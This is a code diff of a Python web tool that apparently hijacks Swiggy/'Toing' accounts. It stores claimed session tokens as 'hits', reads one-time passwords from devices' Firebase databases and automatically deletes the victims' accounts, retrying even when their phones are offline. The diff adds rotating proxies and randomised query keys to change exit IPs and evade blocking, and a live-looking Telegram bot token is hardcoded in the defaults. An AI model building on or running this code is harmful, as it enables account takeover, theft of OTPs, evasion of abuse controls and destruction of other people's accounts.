@@ -55,8 +55,10 @@ SETTINGS_FILE = data_path("settings.json")
 LINKS_FILE = data_path("firebase_links.json")
 STATS_FILE = data_path("stats.json")
 HITS_DIR = data_path("hits")
+HITS_FILE = data_path("hits_index.json")
 DELETE_STATE_FILE = data_path("delete_state.json")
 DELETE_JOBS_FILE = data_path("delete_jobs.json")
+DELETE_PENDING_FILE = data_path("delete_pending.json")
 ONLINE_WATCHES_FILE = data_path("online_watches.json")
 os.makedirs(HITS_DIR, exist_ok=True)
 
@@ -67,6 +69,9 @@ IST = __import__("datetime").timezone(__import__("datetime").timedelta(hours=5, 
 DEFAULTS = {
     # proxy (Swiggy/Toing API only)
     "proxy": "",
+    "proxy_list": [],        # extra proxies; "proxy" also accepts newline/comma separated URLs
+    "proxy_rotate": True,    # round-robin one proxy per Swiggy call
+    "swiggy_query_suffix": "",  # optional provider params, e.g. session={random}
     "ssl_verify": True,
     # telegram
     "tg_bot_token": "6908653973:AAEYy_bhVTY1y2OVwYhM2RfCU4m10chXeV0",
@@ -93,13 +98,13 @@ DEFAULTS = {
     "delete_account_enabled": True,
     "delete_otp_timeout": 90,
     "delete_otp_interval": 5,
-    "delete_retry_default": 7200,   # seconds; per-job override at creation
+    "delete_retry_default": 120,    # seconds; per-job override at creation
     "online_alert_interval": 30,
     "online_alert_default": 3600,   # seconds; per-watch override at creation
 }
 
 SECTIONS = {
-    "proxy": ["proxy", "ssl_verify"],
+    "proxy": ["proxy", "proxy_list", "proxy_rotate", "swiggy_query_suffix", "ssl_verify"],
     "telegram": ["tg_bot_token", "tg_chat_id"],
     "referral": ["referral_code", "campaign_id", "referrer_name", "account_name"],
     "firebase": ["firebase_secret", "firebase_timeout", "device_filter"],
@@ -129,9 +134,11 @@ RUN_LINKS = []  # shuffled Firebase order for the current run
 # Delete / online-alert automation state
 DELETE_STATE = {}      # number -> {"deleted": bool, "at": iso}
 DELETE_JOBS = {}       # job_id -> job dict (persisted)
+DELETE_PENDING = {}    # number -> pending delete OTP state (persisted)
 ONLINE_WATCHES = {}    # watch_id -> watch dict (persisted)
 DELETE_LOCK = threading.Lock()
 JOB_LOCK = threading.Lock()
+PENDING_LOCK = threading.Lock()
 WATCH_LOCK = threading.Lock()
 JOB_THREADS = {}
 WATCH_THREADS = {}
@@ -140,6 +147,11 @@ WATCH_THREADS = {}
 MANUAL_SESSIONS = {}   # sid -> {phone, dev, tid, sid, ref, created, code/campaign}
 MANUAL_LOCK = threading.Lock()
 MANUAL_TTL = 900
+
+# Proxy rotation (round-robin; one proxy per Swiggy call).
+PROXY_INDEX = 0
+PROXY_LOCK = threading.Lock()
+LAST_PROXY = ""
 
 LOG_COLORS = {
     "INFO": "\x1b[90m",      # grey
@@ -350,6 +362,47 @@ def send_telegram(message):
         return False
 
 
+# ─── Proxy rotation ───────────────────────────────────────────────────────
+def configured_proxies():
+    """All proxy URLs from Settings. Accepts one URL, newline/comma separated
+    URLs, or a proxy_list array. Duplicates are removed, order preserved."""
+    raw = str(get_setting("proxy", str) or "").strip()
+    extra = get_setting("proxy_list", list) or []
+    parts = [x.strip() for x in re.split(r"[\n,;]+", raw) if x.strip()]
+    parts += [str(x).strip() for x in extra if str(x).strip()]
+    out = []
+    for p in parts:
+        if p not in out:
+            out.append(p)
+    return out
+
+
+def pick_proxy():
+    """Return one proxy URL per call so the exit IP can change. Returns ''
+    for a true direct connection when no proxy is configured."""
+    global PROXY_INDEX, LAST_PROXY
+    proxies = configured_proxies()
+    if not proxies:
+        LAST_PROXY = ""
+        return ""
+    if not get_setting("proxy_rotate", bool) or len(proxies) == 1:
+        LAST_PROXY = proxies[0]
+        return proxies[0]
+    with PROXY_LOCK:
+        p = proxies[PROXY_INDEX % len(proxies)]
+        PROXY_INDEX += 1
+    LAST_PROXY = p
+    return p
+
+
+def proxy_label(url):
+    """Safe log label - never print proxy credentials."""
+    if not url:
+        return "DIRECT"
+    clean = re.sub(r"^[^@]+@", "", url)
+    return clean.split("/")[0].rstrip(":")
+
+
 # ─── HTTP helper: explicit proxy only, never inherited env proxies ───────
 def http_request(method, url, headers=None, json_body=None, proxy=None,
                  verify=True, timeout=30):
@@ -366,14 +419,33 @@ def http_request(method, url, headers=None, json_body=None, proxy=None,
 
 
 # ─── Toing API helpers (proxy applies HERE only) ─────────────────────────
+def decorate_url(url):
+    """Optional provider-specific query params. {random} becomes a new key per
+    call, which some rotating gateways require to change the exit IP."""
+    suffix = str(get_setting("swiggy_query_suffix", str) or "").strip()
+    if not suffix:
+        return url
+    suffix = suffix.replace("{random}", uuid.uuid4().hex[:10])
+    suffix = suffix.replace("{time}", str(int(time.time())))
+    return url + ("&" if "?" in url else "?") + suffix.lstrip("?&")
+
+
 def swiggy_call(method, url, headers, body=None):
-    proxy = get_setting("proxy", str).strip()
+    proxy = pick_proxy()
+    label = proxy_label(proxy)
+    req_url = decorate_url(url)
     try:
-        r = http_request(method, url, headers=headers, json_body=body, proxy=proxy,
+        r = http_request(method, req_url, headers=headers, json_body=body, proxy=proxy,
                          verify=get_setting("ssl_verify", bool),
                          timeout=get_setting("request_timeout", int))
+        if r.status_code != 200:
+            log("swiggy %s %s via %s -> HTTP %d"
+                % (method, url.split("?")[0].replace(BASE, ""), label, r.status_code), "ERROR")
         return r.status_code, r.text
     except Exception as exc:
+        log("swiggy %s %s via %s -> %s: %s"
+            % (method, url.split("?")[0].replace(BASE, ""), label,
+               type(exc).__name__, str(exc)[:160]), "ERROR")
         return None, "%s: %s" % (type(exc).__name__, exc)
 
 
@@ -613,6 +685,7 @@ def save_session(number, sess, db, device_id, outcome):
         hits.append({"number": number, "db": db, "device_id": device_id,
                      "outcome": outcome, "file": path,
                      "at": datetime.now(IST).isoformat()})
+        save_hits_unlocked()
     return path
 
 
@@ -865,6 +938,64 @@ def save_map(path, data):
         log("state save error (%s): %s" % (os.path.basename(path), exc), "ERROR")
 
 
+def load_hits():
+    """Rebuild the in-memory Hits list from the persisted index on startup."""
+    global hits
+    try:
+        if os.path.exists(HITS_FILE):
+            with open(HITS_FILE, "r", encoding="utf-8") as handle:
+                data = json.load(handle)
+            if isinstance(data, list):
+                with hits_lock:
+                    hits = [x for x in data if isinstance(x, dict)]
+    except Exception as exc:
+        log("hits index load error: %s" % exc, "ERROR")
+
+    # If a redeploy lost the index but the volume still has the session files,
+    # rebuild rows from them so past hits do not disappear from the UI.
+    with hits_lock:
+        known = {str(x.get("number")) for x in hits}
+        recovered = 0
+        try:
+            for name in os.listdir(HITS_DIR):
+                if not (name.startswith("claimed_session_") and name.endswith(".json")):
+                    continue
+                number = name[len("claimed_session_"):-len(".json")]
+                if number in known:
+                    continue
+                path = os.path.join(HITS_DIR, name)
+                sess = {}
+                try:
+                    with open(path, "r", encoding="utf-8") as handle:
+                        loaded = json.load(handle)
+                    if isinstance(loaded, dict):
+                        sess = loaded
+                except Exception:
+                    pass
+                try:
+                    at = datetime.fromtimestamp(os.path.getmtime(path), IST).isoformat()
+                except Exception:
+                    at = ""
+                hits.append({"number": number, "db": "", "device_id": sess.get("deviceId", ""),
+                             "outcome": "RECOVERED SESSION", "file": path, "at": at})
+                known.add(number)
+                recovered += 1
+        except Exception as exc:
+            log("hits recovery error: %s" % exc, "ERROR")
+        if recovered:
+            log("Recovered %d hit(s) from saved session files" % recovered, "HIT")
+            save_hits_unlocked()
+
+
+def save_hits_unlocked():
+    """Caller must hold hits_lock."""
+    try:
+        with open(HITS_FILE, "w", encoding="utf-8") as handle:
+            json.dump(hits, handle, indent=2, ensure_ascii=False)
+    except Exception as exc:
+        log("hits index save error: %s" % exc, "ERROR")
+
+
 def load_delete_state():
     global DELETE_STATE
     DELETE_STATE = load_map(DELETE_STATE_FILE)
@@ -892,8 +1023,19 @@ def save_watches():
     save_map(ONLINE_WATCHES_FILE, ONLINE_WATCHES)
 
 
+def load_pending():
+    global DELETE_PENDING
+    DELETE_PENDING = load_map(DELETE_PENDING_FILE)
+
+
+def save_pending():
+    save_map(DELETE_PENDING_FILE, DELETE_PENDING)
+
+
+load_hits()
 load_delete_state()
 load_jobs()
+load_pending()
 load_watches()
 
 
@@ -989,11 +1131,12 @@ def mark_deleted(hit, ok=True):
             "db": hit.get("db", ""),
         }
         save_delete_state()
-    # reflect on in-memory hit
+    # reflect on persisted hit
     with hits_lock:
         for h in hits:
             if str(h.get("number")) == number:
                 h["deleted"] = bool(ok)
+        save_hits_unlocked()
     if ok:
         send_telegram(
             "🗑 <b>TOING ACCOUNT DELETED</b>\n"
@@ -1005,8 +1148,34 @@ def mark_deleted(hit, ok=True):
         )
 
 
+def delete_submit(hit, sess, otp, verbose=True):
+    """Submit an already-received Archive OTP. Device online state is irrelevant:
+    /delete/user is an API call with the session token, not a device action."""
+    number = str(hit.get("number", ""))
+    st, d, raw = delete_user_confirm(sess, otp)
+    success = (st == 200 and (d.get("statusCode") == 0
+               or "success" in str(raw).lower()
+               or "deleted" in str(raw).lower()))
+    if success:
+        mark_deleted(hit, True)
+        with PENDING_LOCK:
+            DELETE_PENDING.pop(number, None)
+            save_pending()
+        if verbose:
+            log("Delete %s: ACCOUNT DELETED" % number, "WIN")
+        return True
+    if verbose:
+        log("Delete %s: submit failed [HTTP %s] %s - keeping OTP for retry"
+            % (number, st, str(d.get("statusMessage") or raw)[:200]), "ERROR")
+    return False
+
+
 def attempt_delete(hit, verbose=True):
-    """Run the full delete flow for one hit. Returns True on success."""
+    """Request -> poll -> submit the Archive OTP.
+
+    The OTP and baseline are persisted, so a retry job never loses an OTP that
+    already arrived, and submission never depends on device online state.
+    """
     if not get_setting("delete_account_enabled", bool):
         if verbose:
             log("Delete automation disabled in Settings", "ERROR")
@@ -1021,45 +1190,83 @@ def attempt_delete(hit, verbose=True):
             log("Delete %s: %s" % (number, exc), "ERROR")
         return False
 
-    baseline = last_msg_key(db, device_id)
-    st, d, raw = delete_user_check(sess)
-    if not user_check_ok(st, d):
-        if verbose:
-            log("Delete %s: user_check failed [%s] %s"
-                % (number, st, str(d.get("statusMessage") or raw)[:160]), "ERROR")
-        return False
-    # Rotate session values returned by user_check (critical for the OTP to match)
-    if d.get("sid"):
-        sess["sid"] = d["sid"]
-    if d.get("tid"):
-        sess["tid"] = d["tid"]
-    if d.get("deviceId"):
-        sess["deviceId"] = d["deviceId"]
-    write_session(hit, sess)
+    with PENDING_LOCK:
+        pend = dict(DELETE_PENDING.get(number, {}))
+
+    # 1) An OTP we already hold is submitted immediately, online or offline.
+    if pend.get("otp"):
+        for key in ("sid", "tid", "deviceId"):
+            if pend.get(key):
+                sess[key] = pend[key]
+        return delete_submit(hit, sess, str(pend["otp"]), verbose)
+
+    interval = int(get_setting("delete_otp_interval", int))
+    retry = int(get_setting("delete_retry_default", int))
+    now = time.time()
+
+    # 2) Request a fresh OTP only when none is pending, or the previous one has
+    #    had enough time to arrive. Prevents OTP spam on every job tick.
+    need_request = (not pend) or now >= float(pend.get("recheck_after", 0) or 0)
+    if need_request:
+        baseline = last_msg_key(db, device_id)
+        st, d, raw = delete_user_check(sess)
+        if not user_check_ok(st, d):
+            if verbose:
+                log("Delete %s: user_check failed [%s] %s"
+                    % (number, st, str(d.get("statusMessage") or raw)[:160]), "ERROR")
+            return False
+        # Rotate session values returned by user_check (critical for the OTP to match)
+        for key in ("sid", "tid", "deviceId"):
+            if d.get(key):
+                sess[key] = d[key]
+        write_session(hit, sess)
+        with PENDING_LOCK:
+            pend = {
+                "number": number, "baseline": baseline, "db": db,
+                "device_id": device_id, "file": hit.get("file", ""),
+                "sid": sess.get("sid", ""), "tid": sess.get("tid", ""),
+                "deviceId": sess.get("deviceId", ""),
+                "created": datetime.now(IST).isoformat(), "tries": 0,
+            }
+            DELETE_PENDING[number] = pend
+            save_pending()
+    else:
+        baseline = str(pend.get("baseline", ""))
+        for key in ("sid", "tid", "deviceId"):
+            if pend.get(key):
+                sess[key] = pend[key]
 
     otp = poll_delete_otp(db, device_id, baseline,
-                          get_setting("delete_otp_timeout", int),
-                          get_setting("delete_otp_interval", int))
+                          get_setting("delete_otp_timeout", int), interval)
     if not otp:
+        with PENDING_LOCK:
+            p = DELETE_PENDING.get(number)
+            if isinstance(p, dict):
+                p["tries"] = int(p.get("tries", 0)) + 1
+                p["recheck_after"] = now + max(2 * retry, 300)
+                save_pending()
         if verbose:
-            log("Delete %s: Archive OTP not received" % number, "OTPFAIL")
+            log("Delete %s: Archive OTP not received yet - job keeps polling" % number, "OTPFAIL")
         return False
-    if verbose:
-        log("Delete %s: Archive OTP received" % number, "OTP")
 
-    st2, d2, raw2 = delete_user_confirm(sess, otp)
-    success = (d2.get("statusCode") == 0
-               or "success" in str(raw2).lower()
-               or "deleted" in str(raw2).lower())
-    if success:
-        mark_deleted(hit, True)
-        if verbose:
-            log("Delete %s: ACCOUNT DELETED" % number, "WIN")
-        return True
+    with PENDING_LOCK:
+        p = DELETE_PENDING.get(number)
+        if not isinstance(p, dict):
+            p = {"number": number, "db": db, "device_id": device_id,
+                 "file": hit.get("file", ""), "created": datetime.now(IST).isoformat()}
+            DELETE_PENDING[number] = p
+        p["otp"] = otp
+        p["baseline"] = baseline
+        p["otp_at"] = datetime.now(IST).isoformat()
+        save_pending()
+        pend = dict(p)
+
     if verbose:
-        log("Delete %s: failed [%s] %s"
-            % (number, st2, str(d2.get("statusMessage") or raw2)[:200]), "ERROR")
-    return False
+        log("Delete %s: Archive OTP received - submitting (device state ignored)" % number, "OTP")
+    for key in ("sid", "tid", "deviceId"):
+        if pend.get(key):
+            sess[key] = pend[key]
+    return delete_submit(hit, sess, otp, verbose)
 
 
 def start_delete_job(number, interval):
@@ -1071,6 +1278,13 @@ def start_delete_job(number, interval):
     interval = int(interval)
     if interval < 30:
         raise RuntimeError("Interval must be at least 30 seconds")
+    with JOB_LOCK:
+        existing = next((k for k, v in DELETE_JOBS.items()
+                         if str(v.get("number")) == str(number)), None)
+        if existing:
+            DELETE_JOBS[existing]["interval"] = interval
+            save_jobs()
+            return existing
     job_id = uuid.uuid4().hex[:8]
     job = {"number": str(number), "db": hit.get("db", ""),
            "device_id": hit.get("device_id", ""),
@@ -1114,7 +1328,7 @@ def delete_job_loop(job_id):
                 DELETE_JOBS.pop(job_id, None)
                 save_jobs()
             return
-        time.sleep(int(job.get("interval", 7200)))
+        time.sleep(int(job.get("interval", 120)))
 
 
 def cancel_delete_job(job_id):
@@ -1378,6 +1592,8 @@ def hits_page():
             with WATCH_LOCK:
                 row["watch_id"] = next((k for k, v in ONLINE_WATCHES.items()
                                         if str(v.get("number")) == number), "")
+            with PENDING_LOCK:
+                row["pending_otp"] = bool(DELETE_PENDING.get(number, {}).get("otp"))
             rows.append(row)
         return render_template("hits.html", hits=rows)
 
@@ -1434,16 +1650,30 @@ def api_hit_delete():
         hit = next((h for h in hits if str(h.get("number")) == number), None)
     if not hit:
         return jsonify({"status": "error", "message": "Hit not found"})
+    # Online/offline is informational only - it never blocks a delete. An OTP
+    # already in the inbox is submitted even when the device is offline.
     status = device_status(hit.get("db", ""), hit.get("device_id", ""))
-    if status is not True:
-        # Device offline/not found -> auto-create a scheduled delete job.
-        interval = int(get_setting("delete_retry_default", int))
-        job_id = start_delete_job(number, interval)
-        return jsonify({"status": "scheduled", "job_id": job_id,
-                        "message": "Device offline/not found - auto-delete every %ds" % interval})
+    state_label = "ONLINE" if status is True else ("OFFLINE" if status is False else "NOT FOUND")
+    log("Delete %s: device %s - proceeding with delete flow" % (number, state_label), "INFO")
+
     ok = attempt_delete(hit)
-    return jsonify({"status": "success" if ok else "error",
-                    "message": "Account deleted" if ok else "Delete failed - check logs"})
+    if ok:
+        return jsonify({"status": "success", "message": "Account deleted"})
+
+    # OTP not available (or submit failed): keep retrying in the background.
+    # The OTP is persisted, so the job will submit the same OTP once available.
+    with JOB_LOCK:
+        existing = next((k for k, v in DELETE_JOBS.items()
+                         if str(v.get("number")) == number), None)
+    if existing:
+        return jsonify({"status": "scheduled", "job_id": existing,
+                        "message": "OTP pending - job %s keeps retrying and will submit "
+                                   "as soon as it arrives (device state ignored)" % existing})
+    interval = int(get_setting("delete_retry_default", int))
+    job_id = start_delete_job(number, interval)
+    return jsonify({"status": "scheduled", "job_id": job_id,
+                    "message": "OTP pending - auto-retry every %ds; submits immediately "
+                               "when received, even if device is offline" % interval})
 
 
 @app.route("/api/hits/delete/schedule", methods=["POST"])
@@ -1472,6 +1702,7 @@ def api_hit_remove():
         if idx is None:
             return jsonify({"status": "error", "message": "Hit not found"})
         hit = hits.pop(idx)
+        save_hits_unlocked()
     # cancel jobs/watches for this number
     for jid in [k for k, v in DELETE_JOBS.items() if str(v.get("number")) == number]:
         cancel_delete_job(jid)
@@ -1487,6 +1718,9 @@ def api_hit_remove():
     with DELETE_LOCK:
         DELETE_STATE.pop(number, None)
         save_delete_state()
+    with PENDING_LOCK:
+        DELETE_PENDING.pop(number, None)
+        save_pending()
     return jsonify({"status": "success", "message": "Hit removed"})
 
 
@@ -1635,16 +1869,58 @@ def api_stats_reset():
 
 @app.route("/api/test_proxy", methods=["POST"])
 def api_test_proxy():
-    proxy = (request.json or {}).get("proxy", "") or get_setting("proxy", str)
-    if not proxy:
-        return jsonify({"status": "error", "message": "No proxy"})
-    try:
-        r = requests.get("https://profile.swiggy.com/",
-                         proxies={"http": proxy, "https": proxy},
-                         verify=get_setting("ssl_verify", bool), timeout=20)
-        return jsonify({"status": "success", "http": r.status_code, "bytes": len(r.content)})
-    except Exception as exc:
-        return jsonify({"status": "error", "message": str(exc)})
+    given = str((request.json or {}).get("proxy", "") or "").strip()
+    proxies = ([x.strip() for x in re.split(r"[\n,;]+", given) if x.strip()]
+               if given else configured_proxies())
+    if not proxies:
+        return jsonify({"status": "error", "message": "No proxy configured"})
+    results = []
+    for px in proxies:
+        row = {"proxy": proxy_label(px)}
+        try:
+            r = http_request("GET", "https://profile.swiggy.com/",
+                             headers={"user-agent": "Swiggy-Android"}, proxy=px,
+                             verify=get_setting("ssl_verify", bool), timeout=20)
+            row["http"] = r.status_code
+            row["bytes"] = len(r.content)
+        except Exception as exc:
+            row["http_error"] = "%s: %s" % (type(exc).__name__, str(exc)[:140])
+        try:
+            r2 = http_request("GET", "https://api.ipify.org?format=json", proxy=px,
+                              verify=get_setting("ssl_verify", bool), timeout=15)
+            row["exit_ip"] = j(r2.text).get("ip") or r2.text[:80]
+        except Exception as exc:
+            row["ip_error"] = "%s: %s" % (type(exc).__name__, str(exc)[:140])
+        results.append(row)
+    return jsonify({"status": "success", "count": len(results), "results": results})
+
+
+@app.route("/api/proxy/probe", methods=["POST"])
+def api_proxy_probe():
+    """Make several calls and show exit IP per call. Proves whether the
+    endpoint really rotates and whether a 403 follows a particular IP."""
+    n = min(10, max(1, int((request.json or {}).get("count", 5) or 5)))
+    results = []
+    for i in range(n):
+        px = pick_proxy()
+        row = {"i": i + 1, "proxy": proxy_label(px)}
+        try:
+            r = http_request("GET", "https://api.ipify.org?format=json", proxy=px,
+                             verify=get_setting("ssl_verify", bool), timeout=15)
+            row["exit_ip"] = j(r.text).get("ip") or r.text[:60]
+        except Exception as exc:
+            row["ip_error"] = "%s: %s" % (type(exc).__name__, str(exc)[:100])
+        try:
+            r2 = http_request("GET", BASE + "/",
+                              headers={"user-agent": "Swiggy-Android"}, proxy=px,
+                              verify=get_setting("ssl_verify", bool), timeout=15)
+            row["swiggy_http"] = r2.status_code
+        except Exception as exc:
+            row["swiggy_error"] = "%s: %s" % (type(exc).__name__, str(exc)[:100])
+        results.append(row)
+    ips = [x.get("exit_ip") for x in results if x.get("exit_ip")]
+    return jsonify({"status": "success", "calls": n,
+                    "unique_ips": len(set(ips)), "results": results})
 
 
 # ─── Dry run ──────────────────────────────────────────────────────────────
@@ -1757,6 +2033,122 @@ def dry_run():
         except Exception:
             pass
     log("Delete flow: headers, OTP match, persisted DELETED state OK")
+
+    # Hits index must survive a process restart / redeploy.
+    tmp_h = tempfile.mkdtemp(prefix="toing-hits-")
+    old_hits_file, old_hits = HITS_FILE, list(hits)
+    try:
+        globals()["HITS_FILE"] = os.path.join(tmp_h, "hits_index.json")
+        globals()["hits"] = [{"number": "dry-hit", "db": "db", "device_id": "d",
+                              "outcome": "REFERRED: X", "file": "", "at": "now"}]
+        with hits_lock:
+            save_hits_unlocked()
+        globals()["hits"] = []
+        load_hits()
+        assert hits and hits[0]["number"] == "dry-hit", "hits index not reloaded"
+    finally:
+        globals()["HITS_FILE"] = old_hits_file
+        globals()["hits"] = old_hits
+        import shutil
+        shutil.rmtree(tmp_h, ignore_errors=True)
+    log("Hits index: saved and reloaded across restart OK")
+
+    # Proxy rotation: one proxy per call, round-robin, credentials never logged.
+    orig_get = globals()["get_setting"]
+    def fake_setting(key, cast=None):
+        if key == "proxy":
+            return "http://a.test:1, http://b.test:2"
+        if key == "proxy_list":
+            return []
+        if key == "proxy_rotate":
+            return True
+        return orig_get(key, cast)
+    try:
+        globals()["get_setting"] = fake_setting
+        globals()["PROXY_INDEX"] = 0
+        picks = [pick_proxy() for _ in range(5)]
+        assert picks == ["http://a.test:1", "http://b.test:2",
+                         "http://a.test:1", "http://b.test:2",
+                         "http://a.test:1"], picks
+        assert proxy_label("http://user:pass@host.test:1234") == "host.test:1234"
+        globals()["get_setting"] = lambda k, c=None: (
+            "sid={random}" if k == "swiggy_query_suffix" else fake_setting(k, c))
+        u = decorate_url(BASE + "/api/v3/app/sms_otp?mobile=9999999999")
+        assert "&sid=" in u and "{random}" not in u, u
+        assert len(u.split("sid=")[1]) == 10
+    finally:
+        globals()["get_setting"] = orig_get
+    log("Proxy rotation: round-robin, credential-safe label, URL session key OK")
+
+    # Pending OTP: submitted immediately even if the device is offline, and
+    # never re-requests user_check once an OTP is already in hand.
+    tmp_p = tempfile.mkdtemp(prefix="toing-pending-")
+    sess_path = os.path.join(tmp_p, "s.json")
+    with open(sess_path, "w", encoding="utf-8") as handle:
+        json.dump({"token": "tk", "sid": "s", "tid": "t", "deviceId": "d"}, handle)
+    saved = {
+        "pending_file": DELETE_PENDING_FILE, "state_file": DELETE_STATE_FILE,
+        "sw": globals()["swiggy_call"], "poll": globals()["poll_delete_otp"],
+        "tg": globals()["send_telegram"], "dev": globals()["device_status"],
+        "att": globals()["attempt_delete"], "hits": list(hits),
+        "pending": dict(DELETE_PENDING), "state": dict(DELETE_STATE),
+    }
+    try:
+        globals()["DELETE_PENDING_FILE"] = os.path.join(tmp_p, "delete_pending.json")
+        globals()["DELETE_STATE_FILE"] = os.path.join(tmp_p, "delete_state.json")
+        globals()["DELETE_PENDING"] = {}
+        globals()["DELETE_STATE"] = {}
+        globals()["send_telegram"] = lambda *a, **k: True
+        globals()["poll_delete_otp"] = lambda *a, **k: "123456"
+
+        def fake_sw(method, url, headers, body=None):
+            if url.endswith("/user_check"):
+                return 200, json.dumps({"statusCode": 28, "sid": "s2",
+                                        "tid": "t2", "deviceId": "d2"})
+            if url.endswith("/delete/user"):
+                return 200, json.dumps({"statusCode": 0, "statusMessage": "Success"})
+            return 200, "{}"
+        globals()["swiggy_call"] = fake_sw
+        hit = {"number": "dry-pending", "db": "db", "device_id": "dev", "file": sess_path}
+        assert attempt_delete(hit) is True
+        assert DELETE_STATE.get("dry-pending", {}).get("deleted") is True
+        assert DELETE_PENDING.get("dry-pending") is None
+
+        globals()["DELETE_PENDING"]["dry-offline"] = {
+            "number": "dry-offline", "otp": "654321", "sid": "s9", "tid": "t9",
+            "deviceId": "d9", "db": "db", "device_id": "dev",
+            "file": sess_path, "baseline": "0",
+        }
+
+        def no_recheck(method, url, headers, body=None):
+            if url.endswith("/user_check"):
+                raise AssertionError("user_check re-sent while an OTP is pending")
+            return 200, json.dumps({"statusCode": 0})
+        globals()["swiggy_call"] = no_recheck
+        hit2 = {"number": "dry-offline", "db": "db", "device_id": "dev", "file": sess_path}
+        assert attempt_delete(hit2) is True, "pending OTP was not submitted offline"
+
+        globals()["swiggy_call"] = lambda *a, **k: (200, json.dumps({"statusCode": 0}))
+        globals()["device_status"] = lambda *a, **k: False  # simulate offline device
+        globals()["attempt_delete"] = lambda *a, **k: True
+        globals()["hits"] = [{"number": "dry-api", "db": "db",
+                              "device_id": "dev", "file": sess_path}]
+        rr = app.test_client().post("/api/hits/delete", json={"number": "dry-api"})
+        assert rr.json["status"] == "success", rr.json
+    finally:
+        globals()["DELETE_PENDING_FILE"] = saved["pending_file"]
+        globals()["DELETE_STATE_FILE"] = saved["state_file"]
+        globals()["swiggy_call"] = saved["sw"]
+        globals()["poll_delete_otp"] = saved["poll"]
+        globals()["send_telegram"] = saved["tg"]
+        globals()["device_status"] = saved["dev"]
+        globals()["attempt_delete"] = saved["att"]
+        globals()["hits"] = saved["hits"]
+        globals()["DELETE_PENDING"] = saved["pending"]
+        globals()["DELETE_STATE"] = saved["state"]
+        import shutil
+        shutil.rmtree(tmp_p, ignore_errors=True)
+    log("Delete: pending OTP submitted offline, no OTP re-send, offline API path OK")
 
     old_target = RUN_TARGET
     try:
